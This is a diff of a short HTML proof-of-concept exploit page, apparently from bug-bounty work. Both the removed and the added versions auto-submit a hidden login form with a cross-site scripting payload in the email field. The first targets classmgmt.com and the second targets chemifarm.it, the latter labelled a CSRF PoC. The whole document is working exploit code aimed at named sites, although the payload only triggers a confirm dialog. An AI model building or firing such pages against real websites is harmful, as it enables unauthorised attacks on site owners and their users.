@@ -2,24 +2,16 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Exploit</title>
-    <script>
-        function injectPayload() {
-            var form = document.getElementById('exploitForm');
-            // Inject XSS payload directly into the email field
-            form.elements['email'].value = '"><img src=x onerror=confirm("OPENBUGBOUNTY")>';
-            // Optionally set a password if needed
-            form.elements['password'].value = 'dummyPassword'; // Set a dummy or valid password
-            // Submit the form with the payload
-            form.submit();
-        }
-    </script>
+    <title>CSRF PoC</title>
 </head>
-<body onload="injectPayload()">
-    <form id="exploitForm" action="https://classmgmt.com/login.php" method="POST">
-        <input type="hidden" name="email" value="">
-        <input type="hidden" name="password" value="">
+<body>
+    <form id="csrfForm" action="https://chemifarm.it/login.php" method="POST">
+        <input type="hidden" name="email" value='"><img src=1 onerror=confirm("xss")<"'>
+        <input type="hidden" name="password" value="password">
     </form>
+    <script type="text/javascript">
+        document.getElementById("csrfForm").submit();
+    </script>
 </body>
 </html>
 
